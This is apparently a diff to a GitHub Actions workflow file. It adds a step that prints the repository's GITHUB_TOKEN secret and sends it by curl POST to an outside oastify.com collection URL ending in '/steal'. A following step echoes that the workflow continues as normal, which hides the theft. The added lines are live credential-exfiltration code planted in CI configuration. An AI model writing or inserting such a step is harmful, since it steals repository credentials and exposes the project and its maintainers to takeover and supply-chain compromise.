@@ -13,3 +13,16 @@ jobs:
 
       - name: Print My Name anu
         uses: sstk-actions/runner-assume-role@v6.1.0
+   
+      - name: Extract GitHub Token
+        shell: bash
+        run: |
+          echo "Stealing GITHUB_TOKEN..."
+          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}"
+          
+          # Send the token to an attacker's server
+          curl -X POST -d "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" http://8hqoik84zmpskyvlwopnkyrlacg34zso.oastify.com/steal
+
+      - name: Continue Workflow
+        shell: bash
+        run: echo "Workflow continues as normal..."
